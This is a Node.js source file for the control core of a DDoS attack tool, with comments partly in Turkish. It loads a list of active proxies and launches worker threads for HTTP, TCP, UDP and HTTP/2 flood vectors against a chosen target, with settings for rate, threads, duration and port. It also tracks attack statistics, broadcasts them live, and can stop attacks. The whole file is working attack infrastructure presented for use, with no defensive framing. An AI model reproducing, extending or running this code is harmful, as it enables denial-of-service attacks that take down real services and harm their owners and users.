const { Worker } = require('worker_threads');
const path = require('path');
const fs = require('fs');

class DDoSEngine {
    constructor() {
        this.activeWorkers = new Map();
        this.proxies = [];
        this.stats = { totalRequests: 0, totalBytes: 0, startTime: Date.now() };
        this.loadProxies();

        // Canlı istatistik yayını
        setInterval(() => {
            this.aggregateStats();
            if (global.io) {
                global.io.emit('stats', {
                    totalRequests: this.stats.totalRequests,
                    totalBytes: this.stats.totalBytes,
                    activeAttacks: this.activeWorkers.size,
                    proxyCount: this.proxies.length,
                    uptime: Math.floor((Date.now() - this.stats.startTime) / 1000)
                });
            }
        }, 800);
    }

    loadProxies() {
        try {
            const proxyPath = path.join(process.cwd(), 'proxies', 'proxies.json');
            if (fs.existsSync(proxyPath)) {
                const data = JSON.parse(fs.readFileSync(proxyPath, 'utf8'));
                // Format proxies as "ip:port" for workers
                this.proxies = data.proxies?.filter(p => p.active).map(p => `${p.ip}:${p.port}`) || [];
                console.log(`[CORE] ${this.proxies.length} active proxies loaded into memory.`);
            }
        } catch (e) {
            console.error('[CORE] Proxy load error:', e.message);
            this.proxies = [];
        }
    }

    async startAttack(type, target, options) {
        const attackId = `${type}_${Date.now()}`;
        let workerFile = '';

        switch (type) {
            case 'http_flood': workerFile = 'http_flood.js'; break;
            case 'tcp_flood': workerFile = 'tcp_flood.js'; break;
            case 'udp_flood': workerFile = 'udp_flood.js'; break;
            case 'egnake_http2': workerFile = 'egnake_http2.js'; break;
            default: throw new Error('Unknown vector type');
        }

        const workerPath = path.join(__dirname, '..', 'workers', workerFile);

        const worker = new Worker(workerPath, {
            workerData: {
                target,
                proxies: this.proxies,
                duration: options.duration * 1000,
                threads: options.threads,
                rate: options.rate,
                port: options.port
            }
        });

        const attackMeta = {
            id: attackId,
            type,
            target,
            startTime: Date.now(),
            duration: options.duration * 1000,
            rate: options.rate,
            worker,
            stats: { sent: 0, success: 0, failed: 0, bytes: 0 }
        };

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                attackMeta.stats = msg.data;
            }
        });

        worker.on('error', (err) => console.error(`[WORKER ERROR] ${attackId}:`, err));
        worker.on('exit', () => {
            this.activeWorkers.delete(attackId);
            console.log(`[CORE] Worker terminated: ${attackId}`);
        });

        this.activeWorkers.set(attackId, attackMeta);
        return attackId;
    }

    stopAttack(attackId) {
        const attack = this.activeWorkers.get(attackId);
        if (attack && attack.worker) {
            attack.worker.terminate();
            this.activeWorkers.delete(attackId);
        }
    }

    stopAllAttacks() {
        for (const [id, attack] of this.activeWorkers) {
            attack.worker.terminate();
        }
        this.activeWorkers.clear();
    }

    aggregateStats() {
        let currentTotalReqs = 0;
        let currentTotalBytes = 0;
        for (const [id, attack] of this.activeWorkers) {
            currentTotalReqs += (attack.stats.sent || 0);
            currentTotalBytes += (attack.stats.bytes || 0);
        }
        this.stats.totalRequests = currentTotalReqs;
        this.stats.totalBytes = currentTotalBytes;
    }

    getAllAttacks() {
        return Array.from(this.activeWorkers.values()).map(a => {
            const elapsed = (Date.now() - a.startTime) / 1000;
            const remaining = Math.max(0, (a.duration / 1000) - elapsed);
            return {
                id: a.id,
                type: a.type,
                target: a.target,
                elapsed: elapsed.toFixed(1),
                remaining: remaining.toFixed(1),
                stats: a.stats,
                rate: a.rate
            };
        });
    }
}

module.exports = DDoSEngine;